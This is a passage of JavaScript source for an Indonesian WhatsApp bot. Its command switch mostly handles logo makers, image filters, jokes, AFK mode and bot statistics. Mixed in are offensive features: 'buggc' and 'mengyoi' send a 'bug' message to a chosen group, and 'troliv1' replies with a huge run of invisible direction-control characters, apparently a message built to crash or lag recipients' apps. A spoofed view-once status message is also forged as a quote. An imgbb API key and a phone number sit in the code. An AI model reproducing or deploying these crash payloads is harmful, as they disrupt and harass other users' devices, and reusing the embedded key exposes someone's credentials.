case 'gplay': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
gplay = args.join(" ")
reply(mess.wait)
gplay = await getBuffer(`https://api.zeks.me/api/gplaybutton?text=${gplay}&apikey=apivinz`)
ALIYABOT.sendMessage(from, gplay, image, { quoted:mek,caption:'Here you go' })
break
case 'splay': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
splay = args.join(" ")
reply(mess.wait)
splay = await getBuffer(`https://api.zeks.me/api/splaybutton?text=${splay}&apikey=apivinz`)
ALIYABOT.sendMessage(from, splay, image, { quoted:mek,caption:'Here you go' })
break
case 'text3d': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
text3d = args.join(" ")
reply(mess.wait)
text3d = await getBuffer(`https://api.zeks.me/api/text3dbox?apikey=apivinz&text=${text3d}`)
ALIYABOT.sendMessage(from, text3d, image, { quoted:mek,caption:'Here you go' })
break
case 'tfire': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
tfire = args.join(" ")
reply(mess.wait)
tfire = await getBuffer(`https://api.zeks.me/api/tfire?text=${tfire}&apikey=apivinz`)
ALIYABOT.sendMessage(from, tfire, image, { quoted:mek,caption:'Here you go' })
break
case 'light': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
lithg = args.join(" ")
reply(mess.wait)
lithg = await getBuffer(`https://api.zeks.me/api/lithgtext?text=${lithg}&apikey=apivinz`)
ALIYABOT.sendMessage(from, lithg, image, { quoted:mek,caption:'Here you go' })
break
case 'wall': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
wall = args.join(" ")
reply(mess.wait)
wall = await getBuffer(`https://api.zeks.me/api/breakwall?apikey=apivinz&text=${wall}`)
ALIYABOT.sendMessage(from, wall, image, { quoted:mek,caption:'Here you go' })
break
case 'dropair': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
dropair = args.join(" ")
reply(mess.wait)
dropair = await getBuffer(`https://api.zeks.me/api/dropwater?apikey=apivinz&text=${dropair}`)
ALIYABOT.sendMessage(from, dropair, image, { quoted:mek,caption:'Here you go' })
break
case 'logocrs': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (args.length < 1) return reply('*Where is the text??*') 
logocrs = args.join(" ")
reply(mess.wait)
logocrs = await getBuffer(`https://api.zeks.me/api/crosslogo?text=${apivinz}&apikey=logocrs`)
ALIYABOT.sendMessage(from, logocrs, image, { quoted:mek,caption:'Here you go' })
break
case 'hartatahta':
case 'bneon':
case 'matrix':
case 'breakwall':
case 'gneon':
case 'dropwater':
case 'flowertext':
case 'crosslogo':
case 'silktext':
case 'flametext':
case 'glowtext':
case 'smoketext':
case 'skytext':
case 'cslogo':
case 'lithgtext':
case 'crismes':
case 'tfire':
case 'sandw':
case 'epep':
case 'text3dbox':
case 'logobp':
case 'leavest':
case 'thundertext':
case 'tlight':
case 'nulis':
if (args.length == 0) return reply(`Example: ${prefix + command} Bot | Indo`)
                    cslogo = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://api.zeks.me/api/cslogo?apikey=ApiBotIndo&text=${txt}`)
                    ALIYABOT.sendMessage(from, buffer, image, { quoted: mek, caption: mess.success})
                    break
case 'wanted':case 'utatoo':case 'unsharpen':case 'thanos':case 'sniper':case 'sharpen':case 'sepia':case 'scary':case 'rip':case 'redple':case 'rejected':case 'posterize':case 'ps4':case 'pixelize':case 'missionpassed':case 'moustache':case 'lookwhatkarenhave':case 'jail':case 'invert':case 'instagram':case 'greyscale':case 'glitch':case 'gay':case 'frame':case 'fire':case 'distort':case 'dictator':case 'deepfry':case 'ddungeon':case 'circle':case 'challenger':case 'burn':case 'brazzers':case 'beautiful':
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
       if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					let cicle = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(mess.wait)
					var ini_gen = `${command}`
					var ciclee = await ALIYABOT.downloadMediaMessage(cicle)
				    var annnu = await uploadImages(ciclee)
					var imoj = await ameApi.generate(ini_gen, { url: annnu})
				     .then( async image =>{

        			await fs.writeFileSync('./media/foto/circle.jpg', image)

					ALIYABOT.sendMessage(from, fs.readFileSync('./media/foto/circle.jpg'), MessageType.image,{quoted: mek, caption: '.stikerin', thumbnail: Buffer.alloc(0)})
			     })
				} else {
					reply(mess.replyFoto())
					}
					await limitAdd(sender, limit)
					break
					case 'tiktok2':
if (args.length < 1) return reply(lang.tahta(prefix, command))
var m1 = m.split("|")[0];
var m2 = m.split("|")[1]; 
let photooxy = await getBuffer(`${alphaapi}/photooxy/${command}?apikey=${alphakey}&text=${m1}&text2=${m2}`)
sendButImage(from,  `Nih udah jadi kak, jgn lupa donasi untuk beli dyno 🐦 ` , `${botname}™© | By ${ownername}`,photooxy, [{"buttonId": `owner`,"buttonText": {"displayText": "👨‍💻 Owner"},"type": "RESPONSE"},{"buttonId": `donasi`,"buttonText": {"displayText": "💰 Donate"},"type": "RESPONSE"}], {thumbnail: Buffer.alloc(0), quoted: mek})
await  limitAdd(sender, limit)
break					                 
case "deltrash":
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await ALIYABOT.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          ALIYABOT.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;
        case "semoji":
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("emojinya?\nExample : /emoji 🗿");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
        case 'cekmati':
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
       case 'afk': 
              if (!isGroup) return reply('khusus geoup')
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              reply(aluty)
              break      
case 'leavetime':
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':                
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${setting.lolkey}`)
                   titid = get_result.result
                   sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                case 'randomnama':
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${setting.lolkey}`)
                    kyyi = anu.result
                   sendButMessage(from, kyyi, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                   case 'random-waifu':
case 'darkjoke':
case 'drakjoke':
case 'memeindo':
case 'darkjokes':
if (isBanned) return reply(mess.ban)
reply(mess.wait)
					let data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(hasil, "imageMessage", { thumbnail: hasil, })).imageMessage
              buttonsMessage = {footerText:'klik button next untuk gambar selanjutnya︎', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @callme_alya_`,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              ALIYABOT.relayWAMessage(prep)
              break;			                    
                    // Textprome //
              case 'storyanime': case 'sanime':{
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dapapi}`)
kodi = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break
                    case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await ALIYABOT.chats.all()
					ALIYABOT.setMaxListeners(26)
					for (let _ of anu) {
						ALIYABOT.deletechat(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					break
                    case 'status':
                              return reply('_ONLINE_')
                    case 'botstat':
      case 'botstats':
      case 'statusbot':
      case 'infobot':
      case 'stats':
      case 'stat':
      case 'statice':
      case 'botstatus':
      if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*BOT STATISTICS*
\`\`\` Group Chats : ${groups.length}\`\`\`
\`\`\` Private Chats : ${privat.length}\`\`\`
\`\`\` Total Chats : ${totalChat.length}\`\`\`
\`\`\` Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\` Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\` Ram Usage : ${ram2}\`\`\`
\`\`\` Platform : ${os.platform()}\`\`\`
\`\`\` Hostname : ${os.hostname()}\`\`\`
\`\`\` Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\` Wa Version: ${ALIYABOT.user.phone.wa_version}\`\`\`
\`\`\` Os Version: ${ALIYABOT.user.phone.os_version}\`\`\`
\`\`\` Device Manufacturer: ${ALIYABOT.user.phone.device_manufacturer}\`\`\`
\`\`\` Device Model: ${ALIYABOT.user.phone.device_model}\`\`\`
\`\`\` Os Build Number: ${ALIYABOT.user.phone.os_build_number}\`\`\``
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}cekme`,buttonText:{displayText:'Chekme🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case '#profile':
case 'me': 
case 'myinfo': 
case 'info': 
case 'profile': 
case 'profil':
case 'profil2':
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply("Khusus di grup");
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `「 *USER INFO* 」

✗⃝📛 Nama : ${pushname}
✗⃝🔗 Tag : @${sender.split("@")[0]}
✗⃝💥 Api : wa.me/${sender.split("@")[0]}

✗⃝💹 Limit : Unlimited Premium
✗⃝💳 Game Limit : 60/60 
✗⃝💷 Balance : $5776
✗⃝👛 Dompet : Tidak Terdeteksi
✗⃝💱 Role : Bronze 1
✗⃝🏧 Level : Tidak Terdeteksi
✗⃝🏦 Xp : Tidak Terdeteksi

✗⃝💌 Status : Premium User
✗⃝⏰ Expired Prem : Unlimited Premium
✗⃝👨‍🎓 Register : Not,Register
✗⃝🚫 Baned : False`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}cekme`,buttonText:{displayText:'Chekme🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break				                                               
case 'quotesyt':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dapapi}`)
                ALIYABOT.sendMessage(from, dapuhy, image, {quoted: mek})        
                break    
case 'auu': // by ALIYABOT
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
       reply('Enggak Kak')
        sendButMessage(from, `Hai Kak ${pushname} 🐤`, `Mau Jawab Apa?`, [
          {
            buttonId: `${prefix}oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;       
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('iyalah masa engga')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
if (isBanned) return reply(mess.ban)
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'iggw':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
  reply('https://instagram.com/_callme_alya_l')
break
   
case 'owner':
case '#owner':
           case '[creator':
             
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
               sendKontak(from, `${owner}`, `${fakeyoi}`, 'Sibukk!!')
               await sleep(1000)
               reply(`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`)              
               break      
            
case 'f':
case 'lock':
 ikymemek = {
  "key": {
    "fromMe": false,
    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
  },
  "message": {
    "viewOnceMessage": {
      "message": {
        "imageMessage": {
          "url": "https://mmg.whatsapp.net/d/f/AjD3dQIM5hW3UkDfnnkice-eMcsMJJALEcgD9HnDGZEp.enc",
          "mimetype": "image/jpeg",
          "fileSha256": "aR3vWUsV9VZUiR+agYok8oM4UHiuhqEShMpQ6SgY9WM=",
          "fileLength": "675",
          "height": 41,
          "width": 52,
          "mediaKey": "6RDG8T+jOb0RfleWzLTclsaVn0EGRA/v78dnS+Y4S+o=",
          "fileEncSha256": "idNxqNtCaHRxuN+AX0uakPrBuiyvx84IksPUYMYgs7Y=",
          "directPath": "/v/t62.7118-24/13810909_985978368802545_7608967834334288292_n.enc?ccb=11-4&oh=359274a24041d97e91597ad1fb40e784&oe=61595B99",
          "mediaKeyTimestamp": "1630826390",
          "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkANAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAApgAAAAAAAAAAAf/EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8AK//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQIBAT8AT//EABQRAQAAAAAAAAAAAAAAAAAAADD/2gAIAQMBAT8AT//Z",
          "viewOnce": true
        }
      }
    }
  },
  "messageTimestamp": "1630826389",
  "status": "SERVER_ACK",
  "mediaData": {
    "localPath": "/data/user/0/com.gbwhatsapp/files/ViewOnce/IMG-20210905-WA0047.jpg"
  }
}
ALIYABOT.sendMessage(from, { "degreesLatitude": '', "degreesLongitude": '', "jpegThumbnail": iye}, MessageType.location, {quoted: ikymemek})
           break          
case 'mengyoi':
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'readall':
              totalchat.map( async ({ jid }) => {
              await ALIYABOT.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca Seluruh Chat !\`\`\``)
              console.log(totalchat.length)
              break	
case 'buggc':
if (!mek.key.fromMe) return;
if (!q) return reply('Masukan ID Grupnya')
sendBug(args[0])
break
///𝑃𝐼𝑅𝑇𝐸𝐾
 case "troliv1":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)    
   reply(`MELANA🔥🔥🔥                                                            MELANA🔥🔥🔥@                                                                  
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏